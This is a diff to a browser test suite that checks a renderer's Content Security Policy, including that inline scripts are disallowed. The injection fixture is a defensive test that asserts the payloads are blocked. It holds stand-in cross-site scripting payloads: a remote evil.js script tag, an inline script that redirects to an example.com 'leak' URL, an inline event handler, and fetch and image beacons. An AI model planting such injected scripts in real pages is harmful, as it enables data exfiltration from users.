@@ -19,7 +19,7 @@ from tests.unit.test_render_support import (
     HOSTILE_URL,
     ZW_NAME,
 )
-from visualx.render import CSP
+from visualx.render import csp_for
 
 pytestmark = pytest.mark.browser
 
@@ -205,10 +205,20 @@ def test_tsc21_search_filters_path(small_page):
 
 INJECT = (
     '<script src="https://example.com/evil.js"></script>'
-    '<script>window.__vx_v=[];document.addEventListener("securitypolicyviolation",function(e){'
-    'window.__vx_v.push(e.violatedDirective+" "+e.blockedURI);});'
-    'try{fetch("https://example.com/beacon").catch(function(){});}catch(e){}'
-    'var im=new Image();im.src="https://example.com/i.png";</script>'
+    # An injected inline script (review 20261103, C-01). With 'unsafe-inline' it
+    # ran and could leave by navigation, which connect-src does not control.
+    '<script>window.__vx_ran=1;location.href="https://example.com/leak?x=1";</script>'
+    '<div id="vx-attr-probe" onclick="window.__vx_attr=1"></div>'
+)
+
+# Runs from the test driver (not an inline script), so the page CSP applies to
+# the requests but not to this code.
+PROBE = (
+    "() => { window.__vx_v = [];"
+    "document.addEventListener('securitypolicyviolation', function (e) {"
+    "window.__vx_v.push(e.violatedDirective + ' ' + e.blockedURI); });"
+    "try { fetch('https://example.com/beacon').catch(function () {}); } catch (e) {}"
+    "var im = new Image(); im.src = 'https://example.com/i.png'; return true; }"
 )
 
 
@@ -216,16 +226,24 @@ def test_tsc32_csp_present_and_blocks(browser, small_render, tmp_path):
     path, _ = small_render
     rec = open_page(browser, path)
     meta = rec.page.locator('meta[http-equiv="Content-Security-Policy"]')
-    assert meta.get_attribute("content") == CSP
+    html = path.read_text(encoding="utf-8")
+    assert meta.get_attribute("content") == csp_for(html)
+    assert "'unsafe-inline'" not in meta.get_attribute("content").split("script-src ")[1].split(";")[0]
     rec.page.context.close()
 
-    html = path.read_text(encoding="utf-8")
     head_end = html.index("</head>")
     injected = html[:head_end] + INJECT + html[head_end:]
     bad = tmp_path / "injected.html"
     bad.write_text(injected, encoding="utf-8")
     rec2 = open_page(browser, bad)
     page = rec2.page
+    page.wait_for_timeout(500)
+    # The injected inline script and the inline event handler did not run.
+    assert page.evaluate("() => window.__vx_ran === undefined && window.__vx_attr === undefined")
+    page.dispatch_event("#vx-attr-probe", "click")
+    assert page.evaluate("() => window.__vx_attr === undefined")
+    assert page.url == bad.resolve().as_uri()
+    page.evaluate(PROBE)
     page.wait_for_timeout(500)
     assert rec2.routed == [], rec2.routed
     assert rec2.external_requests == [], rec2.external_requests
@@ -235,6 +253,7 @@ def test_tsc32_csp_present_and_blocks(browser, small_render, tmp_path):
     violations = page.evaluate("window.__vx_v")
     assert any("connect-src" in v and "example.com" in v for v in violations), violations
     assert any("img-src" in v for v in violations), violations
-    # The map still loads under the strict policy.
+    # The map still loads under the strict policy: the hashes match the page scripts.
     assert page.get_attribute("body", "data-vx-ready") == "1"
+    assert rec2.page_errors == [], rec2.page_errors
     page.context.close()
